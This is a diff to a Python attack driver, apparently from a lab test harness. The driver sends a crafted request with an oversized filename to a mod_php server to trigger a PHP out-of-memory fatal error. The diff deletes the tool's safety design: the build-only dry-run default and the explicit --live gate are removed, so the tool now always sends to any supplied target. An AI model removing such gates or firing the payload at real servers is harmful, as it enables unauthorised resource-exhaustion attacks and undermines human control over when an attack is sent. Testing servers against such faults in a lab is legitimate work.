@@ -24,10 +24,11 @@ or the TARGETS record); absence/128M-default is a pre-flight failure.
 
 Byte-exact receipt parity (knob-off C1 == A1 bytes; embedded sha256 receipts):
   262144: 7c155121cd01eb7df0c9c2bf91172c012c17c986fbfbbb9053dc0121d9da31e3
-Offline-first: dry (default / --dry-run / --build-only) builds + records the
-exact request bytes WITHOUT sending; --live gates the send; POST_MAX_SIZE
-ceiling guard like producer_fpmwiki. Receipt success shape: HTTP 200 +
-149-byte fatal transcript (mod_php keeps 200 when the OOM fires in the
+Transport: the driver (--step producer) and the module CLI send the exact
+request bytes to the supplied target; POST_MAX_SIZE ceiling guard like
+producer_fpmwiki. The dry() byte builder remains available to the library and
+records the same request bytes without a socket. Receipt success shape: HTTP
+200 + 149-byte fatal transcript (mod_php keeps 200 when the OOM fires in the
 machinery; the workers survive, prefork round-robin).
 """
 
@@ -256,7 +257,7 @@ def dry(host_header: str, text_bytes: int, output: Path, memory_limit: str,
 
 def fire(host: str, port: int, text_bytes: int, output: Path, memory_limit: str,
          cookie_sid: str, timeout: float = 10.0, path: str = PATH) -> dict:
-    """Live arm (explicit --live only): knob gate -> ceiling -> single exchange.
+    """Send the arm to the supplied target: knob gate -> ceiling -> one exchange.
 
     Receipt success shape: HTTP 200 + fatal transcript body (worker survives).
     """
@@ -323,12 +324,10 @@ def fire(host: str, port: int, text_bytes: int, output: Path, memory_limit: str,
 
 def main() -> int:
     parser = argparse.ArgumentParser(
-        description="modphp producer stage: build (default) without sending, "
-        "--live for the receipt-ladder arm fire")
+        description="modphp producer stage: send the receipt-ladder arm to the "
+        "supplied target")
     parser.add_argument("--host", default=DEFAULT_HOST)
     parser.add_argument("--port", type=int, default=DEFAULT_PORT)
-    parser.add_argument("--host-header", default=None,
-                        help="Host header value; default <host>:<port>")
     parser.add_argument("--path", default=PATH)
     parser.add_argument("--body-bytes", type=int, default=DEFAULT_BODY_BYTES,
                         help="large filename length N (int); receipt ladder "
@@ -336,31 +335,17 @@ def main() -> int:
     parser.add_argument("--memory-limit", required=True,
                         help="server-side php memory_limit knob value "
                         "(receipt: 2M); refusing absent/128M (knob OFF)")
-    sid_group = parser.add_mutually_exclusive_group()
-    sid_group.add_argument("--sid", default=None,
-                           help="dry: receipt sid (default labprobe123); "
-                           "live: 32 hex chars (Cookie transport)")
-    parser.add_argument("--live", action="store_true",
-                        help="actually send (default: build + record only)")
-    parser.add_argument("--dry-run", action="store_true",
-                        help="default behavior, accepted explicitly")
-    parser.add_argument("--build-only", action="store_true",
-                        help="alias of the default dry build")
+    parser.add_argument("--sid", default=None,
+                        help="32 hex chars (Cookie PHPSESSID transport)")
     parser.add_argument("--timeout", type=float, default=10.0)
     parser.add_argument("--output", required=True, type=Path)
     args = parser.parse_args()
-    if args.live and args.sid is None:
-        parser.error("--live requires --sid (32 hex chars, Cookie transport)")
+    if args.sid is None:
+        parser.error("--sid is required (32 hex chars, Cookie transport)")
 
-    host_header = args.host_header or f"{args.host}:{args.port}"
-    if args.live:
-        summary = fire(args.host, args.port, args.body_bytes, args.output,
-                       args.memory_limit, args.sid, timeout=args.timeout,
-                       path=args.path)
-    else:
-        sid = args.sid.encode("ascii") if args.sid else DEFAULT_SID
-        summary = dry(host_header, args.body_bytes, args.output,
-                      args.memory_limit, sid=sid)
+    summary = fire(args.host, args.port, args.body_bytes, args.output,
+                   args.memory_limit, args.sid, timeout=args.timeout,
+                   path=args.path)
     (args.output / "result.json").write_text(
         json.dumps(summary, indent=2, sort_keys=True) + "\n")
     print(json.dumps({k: v for k, v in summary.items() if k != "artifacts"},
